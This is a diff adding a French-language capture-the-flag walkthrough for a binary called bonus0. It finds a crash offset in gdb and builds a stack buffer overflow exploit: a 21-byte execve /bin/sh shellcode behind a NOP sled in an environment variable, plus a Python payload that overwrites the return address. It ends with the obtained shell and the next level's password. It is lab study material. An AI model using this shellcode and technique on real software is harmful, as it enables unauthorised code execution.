@@ -1,0 +1,47 @@
+objdump -d ./bonus0
+
+Il y a 3 fonctions: main, pp, p
+En lancant le binaire il y a deux read() qui sont faits.
+On essaye de faire segfault le programme.
+
+$> gdb ./bonus0
+Starting program: /home/user/bonus0/bonus0
+ -
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+aaaaaaaaaaaaaaaaaaaaAa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+
+http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+L'offset est 9 et c'est sur la seconde string.
+
+La fonction p() fait un read de 4096 et elle est appelé deux fois.
+Du coup on sait que le premier appel a read est inutile et que l'on doit acceder au second:
+print 'A' * 4095 + '\n'
+
+Le probleme c'est que notre shellcode fait 21 octets et l'offset est de 9 donc on doit lui passer en argument d'une autre facon.
+Nous pouvons le faire grace a une variable d'environnement et recuperer l'adresse de la variable grace a un programme qui va l'a calculer.
+
+On fait un gros decalage avec des nop afin d'etre plus tranquille.
+
+$> export shellcode=`python -c 'print "\x90" * 1000 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`
+
+$> /tmp/a.out shellcode ./bonus0:
+shellcode found at 0xbffffb2b => \x2b\xfb\xff\xbf
+
+Donc on a notre 1er read rempli de A puis un \n pour le finir.
+Puis le second contenant 9 A pour l'offset du segfault suivi de l'adresse de notre variable d'env shellcode et enfin 4082 A pour completer le reste du read et un \n
+
+$> python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x2b\xfb\xff\xbf' + 'A' * 4082 + '\n'" > /tmp/file
+
+$> cat /tmp/file - | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+���AAAAAAA�� AAAAAAAAA+���AAAAAAA��
+ls
+ls: cannot open directory .: Permission denied
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
